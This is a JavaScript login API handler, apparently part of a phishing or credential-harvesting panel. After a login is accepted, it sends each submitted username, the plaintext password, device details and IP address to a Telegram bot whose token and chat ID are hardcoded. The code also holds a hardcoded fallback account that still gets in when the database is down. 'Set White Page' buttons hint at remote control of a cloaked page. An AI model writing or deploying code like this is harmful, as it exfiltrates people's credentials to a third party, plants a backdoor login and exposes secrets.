const fetch = require('node-fetch');
const { Redis } = require('@upstash/redis');

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password, deviceInfo } = req.body;

    try {
        // Check against Redis Users
        const savedPassword = await redis.hget('users', username);
        
        // Default fallback user + dynamic users
        const isValid = (username === 'nextgen' && password === 'nextgen105') || (savedPassword === password);

        if (!isValid) {
            return res.status(401).json({ error: 'INVALID_CREDENTIALS' });
        }
    } catch (e) {
        console.error('Redis Error:', e);
        // If Redis fails, still allow the default admin user
        if (!(username === 'nextgen' && password === 'nextgen105')) {
            return res.status(500).json({ error: 'DATABASE_OFFLINE' });
        }
    }

    // Telegram Config
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5290622641';

    const message = `
🚨 *NEW ACCESS DETECTED* 🚨

👤 *Username:* ${username}
🔑 *Password:* ${password}

📱 *Device:* ${deviceInfo.device}
🌐 *Browser:* ${deviceInfo.browser}
🖥️ *Platform:* ${deviceInfo.platform}
📍 *IP:* ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}

Select action below:
    `;

    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '⚪ Set White Page', callback_data: 'state_white_page' },
                            { text: '📱 Set Mobile UI', callback_data: 'state_mobile_ui' }
                        ]
                    ]
                }
            })
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error);
        return res.status(500).json({ error: 'Failed to notify admin' });
    }
}
